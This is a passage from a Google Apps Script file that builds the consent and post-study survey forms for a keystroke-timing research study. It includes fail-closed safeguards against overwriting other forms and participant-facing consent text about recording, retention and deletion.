/**
 * GSE_O1_Form_Builder.gs — O1 (R3-a・自然作業の常時収集) のフォーム 2 本を構築する。
 *
 * ============================================================================
 * ⚠️★★★ このファイルは **G1 とは別の Apps Script プロジェクト**に貼る。
 * ============================================================================
 *   ★ `GSE_G1_Form_Builder.gs` と**同じプロジェクトに置いてはならない**。
 *
 *   ⚠️ 理由は「整理のため」ではない。**事故が実際に起きているから**である:
 *     2026-08-07、Apps Script の関数セレクタの選択が反映されないまま `setupG1Forms` が走り、
 *     `buildConsentForm()` の `clearForm()` が **G1-C 説明・同意の全設問を削除**した。
 *     ★ 回答レコード 3 件は残ったが、**どの設問への答えかが失われた**
 *       (要約・個別のどちらも「回答なし」表示になった。実測)。
 *     ⚠️★★★ **Google Forms に回答の版履歴は無い。取り返しがつかない。**
 *
 *   → ★ 本ファイルは **3 段**で同じ事故を防ぐ。⚠️ どれか 1 つではなく 3 つとも要る:
 *       1. **別プロジェクト**に貼る (破壊的な関数を同居させない)
 *       2. ★ `o1AssertNotG1Form_` —— G1 のフォーム ID を**拒否する** (貼り間違いを機械で止める)
 *       3. ★ `o1AssertSafeToRebuild_` —— 回答のあるフォームは作り直さない (既定 fail-closed)
 *
 * ============================================================================
 * ★ 配備手順
 * ============================================================================
 *   ⚠️★★★ **2026-08-29 に訂正した。** 旧文は「**研究者が手で行う**。自動操作は関数
 *   セレクタに効かない」だったが、★ **実測で覆した** —— 貼り付け・関数選択・実行・
 *   スクリプト プロパティの編集は**すべて自動操作でできる**（★ 本手順 1〜7 を完走済み）。
 *   ⚠️ 旧記述の真因は **タブが不可視だったこと**（`visibilityState === "hidden"` のとき
 *   入力イベントだけが黙って落ちる）。★ 詳細は
 *   `.claude/skills/browser-verification/SKILL.md` §2.0a と
 *   `.steering/20260829-o1-builder-config-to-properties/decisions.md` D-3。
 *   ⚠️ **人の判断が要る箇所は変わらない**: OAuth の同意画面 / 破壊的関数を撃つ前の確認 /
 *   フォームの共有設定。⚠️★★ **リロードすると関数セレクタは先頭 (`setupO1Forms`) に戻る**
 *   ので、実行の直前に必ず表示を読み直すこと (★ 2026-08-07 の事故と同じ形)。
 *   1. Google Forms で **空のフォームを 2 本**作る (O1 用・G1 のものを使い回さない)。
 *   2. ⚠️★★★ **このファイルは編集しない。** ★ 設定は ⚙️ プロジェクトの設定 →
 *      **スクリプト プロパティ**に入れる (受け口 `GSE_O1_Submit.gs` と同じ規約)。
 *
 *        | キー | 値 |
 *        |---|---|
 *        | `FORM_ID_O1_CONSENT`   | O1-C の編集 URL `.../forms/d/<ここ>/edit` の `<ここ>` |
 *        | `FORM_ID_O1_SURVEY`    | O1-S の同上 |
 *        | `O1_APP_DOWNLOAD_URL`  | **O1 用の**配布フォルダ URL (⚠️ G1 のを指さない) |
 *        | `PHASE1_MGMT_SHEET_ID` | Phase1 の参加者ロスターの ID (★ 下の注記を読むこと) |
 *
 *   3. ★ **なぜソースに書かないか**: ⚠️ `.gs` に貼ると、**repo のコードと Apps Script 上の
 *      コードが必ず食い違う** (★ この repo が繰り返し踏んでいる事故の型)。
 *      ⚠️ さらに配布フォルダ URL は「リンクを知る全員=閲覧者」で、その中に
 *      提出設定 (共有シークレット) が入りうるため、**追跡ファイルに置いてはならない**。
 *   4. ⚠️★★★ **`checkO1FormConfig()` を必ず実行する** (読み取り専用)。
 *      ★ 未設定と打ち間違いは**同じ症状**になるので、機械に見分けさせる。
 *   5. `setupO1Forms()` を実行 → フォーム 2 本が構築される。
 *   6. `previewO1RegisterAckEmail()` で受付メールの文面を目で確認する
 *      (⚠️ メール送信は取り消せない)。
 *   7. `installO1ConsentTrigger()` を **一度だけ**実行 (提出 → 採番 → 受付メール)。
 *   8. ⚠️ 文面を直したら 5 ではなく **`migrateO1ConsentForm()`** を使う
 *      (★ 回答があるフォームを `setupO1Forms()` で作り直すと紐付けが失われる)。
 *
 * ============================================================================
 * ⚠️ 秘密を置かない
 * ============================================================================
 *   ★ 提出の受け口 (`GSE_O1_Submit.gs`) が持つ `FOLDER_ID` / `SHARED_SECRET` を
 *     **このファイルに書かない**。
 *   ⚠️★★★ **「シート ID は秘密ではない」は誤り**（2026-08-29 に訂正）。
 *     ★ フォーム ID は**拒否リストとして**意図的にソースへ置く（公開情報・`gate:allow-id`）が、
 *     ⚠️ **ロスターのシート ID は参加者 PII への直接ポインタ**であり、
 *     ★ スクリプト プロパティに置く（→ `o1Config_()` の注記）。
 *     ⚠️ 混同すると「シート ID は秘密じゃない」を根拠に貼り戻される。
 *
 * 関連: .steering/20260828-o1-forms-and-distribution/
 *       .steering/20260823-o1-nonkeystroke-gap-and-prereg/consent-draft-o1.md (★ 文面の上流)
 *       docs/o1-deletion-ledger.md (★ 保管上限と削除手順の正本)
 *       Form_O1/GSE_O1_Submit.gs (★ 提出の受け口・別ファイル)
 */

// ============================================================
// 設定 (★ **スクリプト プロパティ**に入れる。⚠️ このファイルは編集しない)
// ============================================================
//
// ⚠️★★★ **配備ごとに変わる値をソースに書かない** (研究者判断 2026-08-29)。
//   ★ 受け口 `GSE_O1_Submit.gs` が `FOLDER_ID` / `SHARED_SECRET` で採っている規約に揃える。
//   ★ 理由は 3 つ:
//     1. ⚠️ `.gs` に貼ると **repo のコードと Apps Script 上のコードが食い違う**
//        (★ 「直したはずが配備物に届いていない」を繰り返し生む形である)。
//     2. ⚠️ 配布フォルダ URL は「リンクを知る全員=閲覧者」で、★ その中に提出設定
//        (共有シークレット) が入りうる。→ **追跡ファイルに置いてはならない**
//        (★ `.gitignore` 逐語:「一時的に public にする運用がある」「履歴からは消せない」)。
//     3. ⚠️ ロスターの ID は **参加者 PII への直接ポインタ**である。
//
// ⚠️★★ **ここに移していないもの**は、移すと**安全装置か機械検査が壊れる**ものである:
//   - `G1_FORM_IDS_DO_NOT_TOUCH` … ★ プロパティ未設定 = **拒否リストが空** = 防波堤が黙って無効。
//   - `O1_CONTACT_*` / 保管上限 / 設問文 … ★ 同意文書との一致を `o1_form_builder_test.cjs` が照合。
//   - `O1_AUTO_SEND` / `O1_ALLOW_REBUILD_WITH_RESPONSES` … ★ fail-closed の既定値。

/**
 * スクリプト プロパティから設定を読む。★ ソースには配備固有の値を置かない。
 *
 * ⚠️ 未設定は **空文字** で返す (★ `null` を配らない)。判定は `o1ConfigProblems_()` に集約し、
 * ⚠️ **空のまま構築系を走らせない** (fail-closed)。
 */
function o1Config_() {
  var props = PropertiesService.getScriptProperties();
  return {
    // O1 用の**空フォーム 2 本**の ID。⚠️ 空のままだと fail-closed で止まる (量産防止)。
    consentFormId: String(props.getProperty("FORM_ID_O1_CONSENT") || "").trim(), // O1-C (★ 同意の正本)
    surveyFormId: String(props.getProperty("FORM_ID_O1_SURVEY") || "").trim(), // O1-S 終了後アンケート
    // ★ O1 用のアプリ配布フォルダ (⚠️ **G1 のフォルダを指さない**)。
    //   ⚠️ O1 の配布物は `o1.mode` を含み、G1 のものとは中身が違う
    //      (`experiments/20260801-controlled-friction-task/make-common-app-zip.sh --mode o1`)。
    //   ★ 空なら受付メールは止まる (fail-closed)。⚠️ 空のまま登録させると、被験者は
    //     P-ID だけ受け取ってアプリを入手できない。
    appDownloadUrl: String(props.getProperty("O1_APP_DOWNLOAD_URL") || "").trim(),
    // ★★ P-ID の採番元は **Phase1 のロスターただ 1 つ**である (研究者判断 2026-08-28: G1 と共有)。
    //   ⚠️ 2 か所で採番すると相手の最大値が見えないので**必ず衝突する**。
    //   ⚠️★★ Drive に「【非公開】GSE_Phase1_運用管理シート」が **2 つある** (2026-08-03 実測)。
    //     ✅ 1ND5HSXZ...  参加者ロスター = P006.. (現行)
    //     ❌ 12T8WU4D...  古い (⚠️ 指すと実在の P-ID と衝突する)
    //   ★ 見分け方: 「参加者ロスター」タブに P010 以降が入っているほうが正。
    //
    //   ⚠️★★★ **このキーを `O1_MGMT_SHEET_ID` に改名しない** (研究者判断 2026-08-29)。
    //     ★ 他の 3 キーが `O1_` なのは「O1 固有の実体」を指すからで、⚠️ **これだけは違う**
    //       —— 指す先は **Phase1 のロスター**であり、Phase1 / G1 / O1 の**共用**である
    //       (`docs/o1-deletion-ledger.md` §5b: P-ID↔個人の対応表はここ 1 か所)。
    //     ⚠️ `O1_` を冠すると「O1 にも固有のロスターがある」と読め、★ 新シートを作って
    //       指した瞬間に **2 か所採番**になる (⚠️ 新シートは P001 から出るので実在の
    //       P-ID と衝突する)。★ 拒否リスト `o1IsKnownWrongRoster_` は**既知の古いシート
    //       しか弾けない**ので、⚠️ **「参加者ロスター」タブを持つ新シートは黙って通る**
    //       (★ タブ名が違えば `o1OpenRoster_` が止めるが、⚠️ **危ないのはまさに
    //       「O1 用のロスターを作った」場合**であり、そこは素通りする)。
    //       → **名前が最後の防波堤**である (⚠️ 機械的な検査は未実装・起票 T-23)。
    //     ★ O1 固有の運用管理シートは**別に新設される**。その ID は 5 本目のキー
    //       `O1_MGMT_SHEET_ID` として足すこと (⚠️ G1 が `GSE_G1_MGMT_SHEET_ID` を
    //       採番元と別に持っているのと同じ形)。⚠️ **本キーを転用しない**。
    //     ⚠️★★★ **その新シートに氏名・メールを持たせない** (研究者判断 2026-08-29)。
    //       ★ **P-ID のみ**にする —— G1 が同じ問いに出した答えと同型である
    //         (`Form_G1/GSE_G1_Form_Builder.gs:124` 逐語:「本シートは **実名・メールを
    //         持たない**。実名↔P-ID の対応表を 2 か所に作らない」)。
    //       ★ メール送信に複製は要らない: 登録直後はフォーム回答の `a.email`、後日は
    //         **ロスターの C 列**から引く —— G1 の `g1EmailForPid_`
    //         (`Form_G1/GSE_G1_Form_Builder.gs:2840`) が `getRange(found.row, 3)` を返し、
    //         `:2906` の呼び出し側が `sendTaskMaterialsEmail` (`:2495`) へ渡している。
    //       ⚠️ 複製を作ると削除経路が 2 か所 → 3 か所になり、★ どれか 1 つ漏れると
    //         同意文書 §7 (削除の申し出) が履行できない。
    rosterSheetId: String(props.getProperty("PHASE1_MGMT_SHEET_ID") || "").trim(),
  };
}

// ============================================================
// ⚠️★★★ G1 のフォームを**絶対に触らせない**拒否リスト
// ============================================================
// ★ ここに載っている ID を `FORM_ID_O1_*` に貼ると、構築系は 1 つも動かずに止まる。
//   ⚠️ これは「気をつける」の代わりである。2026-08-07 の事故は
//      **人間の 1 クリックのミスが同意記録を壊せる設計**そのものが原因だった。
//
// ★ フォーム ID は URL に出るので秘密ではない (`GSE_G1_Form_Builder.gs` にも同じ値がある)。
// ⚠️ G1 側のフォームを増やしたら**ここにも足す**。
var G1_FORM_IDS_DO_NOT_TOUCH = {
  // ★ gate:allow-id —— ⚠️ **この 3 本は意図的にソースへ置く**。
  //   ★ フォーム ID は URL に出るので秘密ではなく、⚠️ **拒否リストはコードと一緒に運ばれ
  //     なければ意味が無い**（プロパティ化すると未設定で防波堤が黙って無効になる）。
  "1Hs3NtuOB3IRKHaU6xspL8jd1y4BdVKFK0s4JxHTQdsE": // gate:allow-id
    "G1-C 説明・同意 (⚠️ 2026-08-07 に全設問を消した事故の当事者)",
  "1iDcr0uc_51dEEI_idyJhcozYMX02N3ug-JQ7zSVMHIA": "G1-M 強制比較", // gate:allow-id
  "1ScM_420irB8DUA8EFYyDJBaPBR-_lOa4evtveQBVWjU": "G1-S 終了後アンケート", // gate:allow-id
};

// 既存設問を毎回作り直すか (通常 true)。
var O1_CLEAR_EXISTING = true;

// ★★ 回答があるフォームを作り直してよいか (既定 false = fail-closed)。
//   ⚠️ true にすると **回答と設問の紐付けが失われる**。作業後は必ず false に戻すこと。
//   ★ 回答を保ったまま文面を更新したいときは `migrateO1ConsentForm()` を使う (削除しない)。
var O1_ALLOW_REBUILD_WITH_RESPONSES = false;

// ★ 研究責任者・所属・連絡先 (研究者判断 2026-08-28)。
//   ⚠️★★ `consent-draft-o1.md` §7 と **1 文字も違えない**。片方だけ直すと
//     同意文書とフォームで連絡先が食い違い、⚠️ **フォームのほうが正本**なので実害が出る。
var O1_CONTACT_NAME = "三浦尊統";
var O1_AFFILIATION = "ZEN大学";
var O1_CONTACT_EMAIL = "mmiura.network@gmail.com";
var O1_CONTACT = O1_CONTACT_NAME + "（" + O1_CONTACT_EMAIL + "）";

// ★ true = 受付メールを実送信する / false = **送らずに文面をログへ出すだけ**。
//   ⚠️ 送信は取り消せない。★ 文面を変えたら `previewO1RegisterAckEmail()` で先に確認する。
//   ⚠️★ O1 は**登録直後に P-ID とアプリが要る** (被験者はその日から記録を始める) ので、
//     G1 と同じく実送信を既定にする。
//
// ⚠️★★★ **`GmailApp` を使わない** (security-checker 指摘・2026-08-28)。
//   ★ Apps Script の OAuth スコープは**ソースの静的解析**で決まるため、`GmailApp` が
//     1 行でも書いてあると、実行されなくても **Gmail 全体 (`https://mail.google.com/`)**
//     の認可を要求する。⚠️ このプロジェクトの Gmail には被験者との PII 往復が入っている。
//   ★ 使うのは `MailApp`（`script.send_mail` = 送信のみ）だけにする。
//     下書きの代わりは `previewO1RegisterAckEmail()`（★ ログに出すだけ）が担う。
var O1_AUTO_SEND = true;

// ⚠️ `PHASE1_MGMT_SHEET_ID` と `O1_APP_DOWNLOAD_URL` は **スクリプト プロパティ**へ移した
//   (2026-08-29)。★ 注記は `o1Config_()` の中に置いてある。

// ★ 想定期間 (`consent-draft-o1.md` §2 の逐語と揃える)。
var O1_PERIOD_TEXT = "数日〜数週間";

// ★ 保管上限 (研究者判断 2026-08-28)。⚠️ `docs/o1-deletion-ledger.md` §5 が正本。
//   ⚠️★★ 台帳とフォームで数値が食い違うと、**フォーム (＝同意の正本) のほうが被験者への約束**に
//     なる。★ 台帳を直したらここも直す。
var O1_RETENTION_ENCRYPTED = "受け取った日から 2 年";
var O1_RETENTION_PLAINTEXT = "解析が終わってから 30 日以内";
var O1_RETENTION_METRICS = "論文発表から 5 年";  // ★ 起算点つき（台帳 §5 と一致）

// ============================================================
// ★ 設問タイトルの契約
// ============================================================
// ⚠️★★★ **構築側と回答取得側 (`o1ConsentAnswers_`) が同じ定数を読む。**
//   ★ 片方だけ変えると、提出されても氏名やメールが取れず、⚠️ **黙って発番が止まる**
//     (エラーにならないので気づきにくい)。
var Q_O1_PID = "参加者ID（お持ちの方のみ）";
var Q_O1_NAME = "お名前";
var Q_O1_EMAIL = "メールアドレス";
var Q_O1_OS = "記録に使うパソコンの種類";
var Q_O1_SUBJECT_ID = "参加者ID";

// ★ O1-S の設問タイトルのうち、後段の集計が語で探すもの。
var Q_O1_S_BURDEN = "記録され続けていることが気になりましたか。";
var Q_O1_S_PAUSE_USED = "「一時停止」を使いましたか。";
var Q_O1_S_DECL_REPICK = "「作業の種類」を選び直しましたか。";

// ============================================================
// 入口
// ============================================================

/**
 * ★ O1 のフォーム 2 本を構築する。
 * ⚠️ `setupG1Forms` とは**別プロジェクトの別関数**である。名前も似せていない
 *   (関数セレクタで隣り合わせにしないため)。
 */
function setupO1Forms() {
  var problems = o1ConfigProblems_();
  if (problems.length) {
    throw new Error(
      "⛔ 設定に問題があるので構築しません（fail-closed）:\n  - " +
        problems.join("\n  - ") +
        "\n\n★ `checkO1FormConfig()` を実行すると同じ内容を読み取り専用で確認できます。"
    );
  }
  buildO1ConsentForm();
  buildO1PostSurveyForm();
  Logger.log("🎉 O1 フォーム 2 本 構築完了");
  Logger.log(listO1FormUrls());
  Logger.log(
    "⚠️ ★ 次にやること: previewO1RegisterAckEmail() で文面を確認 → installO1ConsentTrigger()"
  );
}

/**
 * ★★ 読み取り専用の設定チェック。⚠️ **配備手順 4。必ず通す。**
 *
 * ⚠️★★★ なぜ要るか: 「ID が空」と「ID を打ち間違えた」と「G1 の ID を貼った」は
 *   実行してみるまで**同じ症状 (何かが失敗する)** に見える。★ 機械に見分けさせる。
 * ★ フォームを 1 バイトも変更しない。
 */
function checkO1FormConfig() {
  var problems = o1ConfigProblems_();
  if (!problems.length) {
    Logger.log("✅ 設定は揃っています。setupO1Forms() を実行できます。");
    return true;
  }
  Logger.log("❌ 設定に問題があります（" + problems.length + " 件）:");
  problems.forEach(function (p) {
    Logger.log("  - " + p);
  });
  return false;
}

/**
 * ★ 拒否リストに載っているか。⚠️ 素の `obj[id]` だと `constructor` などの
 * **プロトタイプ由来の鍵**が truthy になり、「G1 の ID です」と嘘の理由を出す
 * (fail-closed 方向なので実害は無いが、原因の分からないエラーになる)。
 */
function o1G1FormLabel_(id) {
  return Object.prototype.hasOwnProperty.call(G1_FORM_IDS_DO_NOT_TOUCH, id)
    ? G1_FORM_IDS_DO_NOT_TOUCH[id]
    : null;
}

/**
 * ⚠️★★ **古いほうの Phase1 管理シート**か（★ 拒否リスト）。
 *
 * ⚠️ Drive に「【非公開】GSE_Phase1_運用管理シート」が **2 つある**（2026-08-03 実測）。
 * ★ 古いほうを指すと**実在の P-ID と衝突する**。⚠️ 値をプロパティへ移した以上、
 * ★ 「正しいほうを選べたか」を機械で支えるのはここだけである。
 * ★ 前方一致で見るのは、⚠️ 全長をソースに書かないためである（→ 起票 T-20 / T-21）。
 */
function o1IsKnownWrongRoster_(id) {
  return String(id || "").indexOf("12T8WU4D") === 0;
}

/** 設定の問題を配列で返す。★ `checkO1FormConfig` と `setupO1Forms` が共有する。 */
function o1ConfigProblems_() {
  var cfg = o1Config_();
  var out = [];
  [
    ["FORM_ID_O1_CONSENT", cfg.consentFormId],
    ["FORM_ID_O1_SURVEY", cfg.surveyFormId],
  ].forEach(function (pair) {
    var name = pair[0];
    var id = pair[1];
    if (!id) {
      out.push(
        "スクリプト プロパティ " + name + " が空です（★ 空フォームを作って編集 URL の ID を入れる）"
      );
      return;
    }
    var g1Label = o1G1FormLabel_(id);
    if (g1Label) {
      out.push(
        "⚠️★★★ " +
          name +
          " に **G1 のフォーム ID** が入っています（" +
          g1Label +
          "）。★ O1 用の空フォームを別に作ってください。"
      );
    }
  });
  if (cfg.consentFormId && cfg.consentFormId === cfg.surveyFormId) {
    out.push(
      "⚠️ FORM_ID_O1_CONSENT と FORM_ID_O1_SURVEY が同じ ID です（★ 片方がもう片方を上書きします）"
    );
  }
  if (!cfg.rosterSheetId) {
    out.push(
      "スクリプト プロパティ PHASE1_MGMT_SHEET_ID が空です（★ P-ID の採番元。空だと登録しても発番できません）"
    );
  } else if (o1IsKnownWrongRoster_(cfg.rosterSheetId)) {
    // ⚠️★★★ **古いほうの管理シートを弾く**（code-reviewer MEDIUM・2026-08-29）。
    //   ★ 値をプロパティへ移した結果、⚠️ 「2 つあるうちの正しいほう」を選ぶ**機械的な支え**が
    //     消えていた（注記は残っていたが、注記は実行されない）。
    //   ★ `G1_FORM_IDS_DO_NOT_TOUCH` と同じ「拒否リスト」の形で戻す。
    out.push(
      "⚠️★★★ PHASE1_MGMT_SHEET_ID が **古いほうの管理シート**を指しています" +
        "（★ 実在の P-ID と衝突します）。★「参加者ロスター」タブに P010 以降が入っているほうが正です。"
    );
  }
  if (!cfg.appDownloadUrl) {
    out.push(
      "スクリプト プロパティ O1_APP_DOWNLOAD_URL が空です（⚠️ 受付メールが止まります。★ O1 用の配布フォルダを指すこと）"
    );
  } else if (o1AppDownloadUrlIsBad_(cfg.appDownloadUrl)) {
    // ⚠️★ 打ち間違い（フォルダ ID だけを貼る等）は「未設定」と**同じ症状**になるので機械で分ける。
    out.push(
      "スクリプト プロパティ O1_APP_DOWNLOAD_URL が URL ではありません（★ https:// で始まる配布フォルダの URL を入れる）"
    );
  }
  if (!O1_CONTACT_EMAIL || O1_CONTACT_EMAIL.indexOf("@") < 0) {
    out.push("O1_CONTACT_EMAIL が不正です（★ 削除の申し出先が無いと同意文書 §7 が嘘になります）");
  }
  return out;
}

function listO1FormUrls() {
  var props = PropertiesService.getScriptProperties();
  var out = [];
  ["O1_CONSENT", "O1_SURVEY"].forEach(function (key) {
    var raw = props.getProperty("FORMURL_" + key);
    if (!raw) {
      out.push(key + ": (未生成)");
      return;
    }
    var o = JSON.parse(raw);
    out.push(key + ": " + o.label + "\n  回答: " + o.publishedUrl + "\n  編集: " + o.editUrl);
  });
  return out.join("\n");
}

// ============================================================
// ⚠️★★★ 破壊操作の関門 (★ 3 段のうちの 2 と 3)
// ============================================================

/**
 * ★ 段 2: **G1 のフォーム ID を拒否する。**
 * ⚠️ `FormApp.openById` より**前**に呼ぶこと。開いてしまってからでは遅い。
 */
function o1AssertNotG1Form_(id, varName) {
  var label = o1G1FormLabel_(id);
  if (!label) return;
  throw new Error(
    "⛔⛔⛔ " +
      varName +
      " に **G1 のフォーム ID** が入っています: " +
      label +
      "\n" +
      "★ 中止しました。O1 のビルダーは G1 のフォームに触れません。\n" +
      "⚠️ 2026-08-07 に、これと同じ取り違えで G1-C の全設問が消えています（版履歴はありません）。\n" +
      "★ O1 用の空フォームを新しく作り、その ID を貼ってください。"
  );
}

/**
 * ★ 段 3: **回答があるフォームは作り直さない。**
 * ⚠️ 回答数を確認できないときも**止める** (「確認できなかった」を「0 件」と読み替えない)。
 */
function o1AssertSafeToRebuild_(form, label) {
  var n;
  try {
    n = form.getResponses().length;
  } catch (e) {
    throw new Error(
      "★ " +
        label +
        " の回答数を確認できませんでした: " +
        e +
        "\n" +
        "⚠️ 確認できない以上、作り直しません（fail-closed）。"
    );
  }
  if (n === 0) return;

  if (O1_ALLOW_REBUILD_WITH_RESPONSES) {
    Logger.log(
      "⚠️⚠️ " +
        label +
        ": 回答が " +
        n +
        " 件あるが O1_ALLOW_REBUILD_WITH_RESPONSES=true のため作り直します。\n" +
        "   ★ この操作で **回答と設問の紐付けが失われます**。作業後は必ず false に戻してください。"
    );
    return;
  }

  throw new Error(
    "⛔ " +
      label +
      " には既に回答が " +
      n +
      " 件あります。作り直しを中止しました（fail-closed）。\n" +
      "\n" +
      "★ 回答を保ったまま文面を更新したい場合（ほぼ常にこちら）:\n" +
      "    migrateO1ConsentForm()  … 既存設問を消さず、足りない同意項目だけを足す\n" +
      "\n" +
      "⚠️ どうしても作り直す場合は O1_ALLOW_REBUILD_WITH_RESPONSES = true にしてから再実行し、\n" +
      "   ★ **回答と設問の紐付けが失われることを承知したうえで**行ってください。"
  );
}

/** ★ ID の検証 → 開く。⚠️ 順序を入れ替えない (検証が先)。 */
function o1OpenFixed_(id, varName) {
  if (!id) {
    throw new Error(
      "★ " +
        varName +
        " が空です。フォームを量産しないため停止しました。\n" +
        "先に Google Forms で**空フォーム**を作り、編集 URL\n" +
        "  https://docs.google.com/forms/d/<ここ>/edit\n" +
        "の <ここ> を " +
        varName +
        " に貼ってから再実行してください。"
    );
  }
  o1AssertNotG1Form_(id, varName);
  return FormApp.openById(id);
}

/**
 * 分岐ナビゲーションを先に解除してから末尾削除する。
 * ★ 直接 deleteItem すると go-to-page 参照が残って "Invalid data updating form" になる
 *   (G1 側で実測済みの罠。⚠️ 手順を簡略化しない)。
 */
function o1ClearForm_(form) {
  var items = form.getItems();
  for (var i = 0; i < items.length; i++) {
    var type = items[i].getType();
    try {
      if (type === FormApp.ItemType.MULTIPLE_CHOICE) {
        var mc = items[i].asMultipleChoiceItem();
        mc.setChoices(
          mc.getChoices().map(function (c) {
            return mc.createChoice(c.getValue());
          })
        );
      } else if (type === FormApp.ItemType.LIST) {
        var li = items[i].asListItem();
        li.setChoices(
          li.getChoices().map(function (c) {
            return li.createChoice(c.getValue());
          })
        );
      } else if (type === FormApp.ItemType.PAGE_BREAK) {
        items[i].asPageBreakItem().setGoToPage(FormApp.PageNavigationType.CONTINUE);
      }
    } catch (e) {
      // ナビゲーションを持たない項目はスキップ
    }
  }
  var remaining = form.getItems();
  for (var j = remaining.length - 1; j >= 0; j--) {
    form.deleteItem(remaining[j]);
  }
}

function o1AddSectionHeader_(form, title, description) {
  var section = form.addSectionHeaderItem();
  section.setTitle(title);
  if (description) section.setHelpText(description);
}

function o1RecordFormUrl_(key, form, label) {
  PropertiesService.getScriptProperties().setProperty(
    "FORMURL_" + key,
    JSON.stringify({
      label: label,
      id: form.getId(),
      title: form.getTitle(),
      editUrl: form.getEditUrl(),
      publishedUrl: form.getPublishedUrl(),
    })
  );
}

// ============================================================
// O1-C 参加登録＝説明・同意
// ============================================================
// ⚠️★★★ **このフォームの回答が同意の正本である。**
//   ★ `consent-draft-o1.md` は**配布されない雛形**であり、被験者が実際に読むのはここである。
//   ⚠️ 文面の上流は `consent-draft-o1.md`。★ **先にあちらを直してからここへ写す**
//     (このプロジェクトは「片方だけ直して食い違わせる」事故を繰り返している)。
//
// ★ G1 と同じく「参加登録フォームを別に作らない」。G1 は 2026-08-03 に
//   別立ての参加登録フォームを**重複として廃止**している。

function o1ConsentFormTitle_() {
  return "GSE O1 ふだんの作業の長期記録 — 説明・同意（参加登録）";
}

function o1ConsentFormDescription_() {
  return (
    "ご検討ありがとうございます。以下をお読みのうえ、ご回答ください。\n" +
    "★ 説明を聞いたうえで決めていただくもので、断っても不利益は一切ありません。\n\n" +
    "▼ 何を調べる研究か\n" +
    "ふだんのパソコン作業のあいだ、キーボードやマウスの「操作のしかた」だけを長い期間記録して、" +
    "「席を外していた時間」の中身が見分けられるかを調べます。\n" +
    "★ 文章の中身・画面の内容は記録しません。記録するのは「いつ・どの種類の操作をしたか」だけです。\n" +
    "⚠️ 以前にご案内した G1（70 分の課題実験）とは**まったく別の研究**です。\n\n" +
    "▼ お願いすること（期間: " +
    O1_PERIOD_TEXT +
    "）\n" +
    "・ふだんどおりに作業していただくだけです。特別な課題はありません。\n" +
    "・記録用のアプリを起動しておいていただきます。★ いつでも止められます。\n" +
    "・いま何の作業をしているかを、画面の表示から 4 つの選択肢で選んでいただきます。\n" +
    "  （論述 / 通信文 / デザイン・映像・制作作業 / vibe coding）\n" +
    "  ★ 忘れても記録は続きます。選ばなくてもかまいません。\n" +
    "  ★ 何を選んでも、記録する内容は 1 つも変わりません。\n" +
    "・最後に短いアンケート（5 分ほど）にお答えいただきます。\n\n" +
    "▼ 記録するもの\n" +
    "・キーを押した「時刻」と「種類」（文字キー / バックスペース / 空白 / 改行 / 記号 など）\n" +
    "・日本語入力の変換にかかった時間\n" +
    "・貼り付けの回数と文字数（★ 中身は取得しません）\n" +
    "・画面の切り替えが起きた時刻（★ どのアプリへ切り替えたかは記録しません）\n" +
    "・マウスの「動いた量・ホイールの回数」（Windows ではさらに「押した回数」）を 1 秒ごとに数えた値\n" +
    "・キーボードの配列の種類（開始時に 1 回だけ）／アプリの版／記録がうまくいっていたかの状態\n" +
    "・（macOS のみ）パスワード入力中だった区間の印（★ 中身は一切取得しません）\n" +
    "・上の記録から計算した「作業の状態」の推定値\n\n" +
    "▼ ⚠️ 記録しないもの\n" +
    "・★★★ どの文字を打ったか（本文）／画面の内容・スクリーンショット\n" +
    "・★★★ アプリの名前・ウィンドウのタイトル・URL・ファイル名・プロジェクト名\n" +
    "・★★★ マウスの位置・軌跡・画面の解像度・モニタの配置／クリップボードの中身\n" +
    "・端末を特定できる情報（機体番号・ホスト名など）／位置情報／音声・映像\n\n" +
    "▼ ⚠️★★★ 隠さずに書きます\n" +
    "上の記録から「その時間、席にいて操作していたか」の連続した記録ができます。\n" +
    "★ 何をしていたかは分かりませんが、**いつ作業していて、いつ離れていたかの時間の並び**は残ります。\n" +
    "→ ★ だからこそ、下の「止める・消す」を用意しています。\n\n" +
    "▼ ★★★ あなたがいつでもできること（3 点）\n" +
    "1. **記録中だと分かる** … 記録している間はずっと画面に印が出ます。\n" +
    "   ⚠️ 印が出ていないときは記録していません。\n" +
    "2. **すぐ止める** … ワンクリックで一時停止できます。★ 理由を聞きません。\n" +
    "3. **あとから「この時間帯を消して」と言える** … 時間帯を指定して削除できます。\n" +
    "   ★ 理由を説明する必要はありません。\n\n" +
    "▼ 記録の保管\n" +
    "・記録はまず、あなたの端末の中だけに、暗号化された場所へ保存します。\n" +
    "  ⚠️ クラウド同期フォルダ（OneDrive 等）には置きません。\n" +
    "・⚠️★★★ そのうえで、1 日ごとにひとまとまりにした記録を、**48 時間おいてから**" +
    "暗号化して自動的に研究者へ送ります。\n" +
    "  ★ なぜ 48 時間おくのか: **送る前なら、あなたが「この時間帯を消して」と言えば" +
    "端末の上で消えるから**です。\n" +
    "  ⚠️ 送られたあとは、研究者にお申し出ください。研究者側で削除し、削除したことを記録に残します。\n" +
    "  ★ どちらの場合も、理由を説明する必要はありません。\n" +
    "・記録は P0xx のような記号で管理し、氏名・連絡先とは別に保管します。\n" +
    "・★ 保管の上限: 暗号化した記録は " +
    O1_RETENTION_ENCRYPTED +
    "、研究者が復号したものは " +
    O1_RETENTION_PLAINTEXT +
    "、個人が特定できない集計値は " +
    O1_RETENTION_METRICS +
    " で削除します。\n\n" +
    "▼ お問い合わせ・削除のお申し出\n" +
    "研究責任者: " +
    O1_CONTACT_NAME +
    "（" +
    O1_AFFILIATION +
    "）\n" +
    "連絡先: " +
    O1_CONTACT_EMAIL +
    "\n" +
    "★ 記録の削除をご希望のときも上へお申し出ください。⚠️ 理由をお聞きすることはありません。"
  );
}

/**
 * ★ 同意項目。⚠️ **`consent-draft-o1.md` の約束と 1 対 1 で対応させる。**
 *   ★ 約束を足したのに同意項目を足さない、が最も危ない (被験者が同意していない約束が
 *     文書にだけ載る)。⚠️ 逆に、ここにある項目は**必ず本文で説明されていること**。
 */
function o1ConsentItemTitles_() {
  return [
    "上の説明を読み、質問する機会がありました。",
    "★ ふだんの作業のあいだ、キーやマウスの操作のしかたが「" +
      O1_PERIOD_TEXT +
      "」にわたって記録されることを理解しました。",
    "★★★ 文章の中身・画面の内容・アプリ名・URL・ファイル名は記録されないことを理解しました。",
    "★★★ この記録から「いつ作業していて、いつ離れていたか」の時間の並びが残ることの説明を受けました。",
    "★ 記録している間は画面に印が出ること、印が出ていないときは記録していないことを理解しました。",
    "★ ワンクリックでいつでも一時停止でき、理由を聞かれないことを理解しました。",
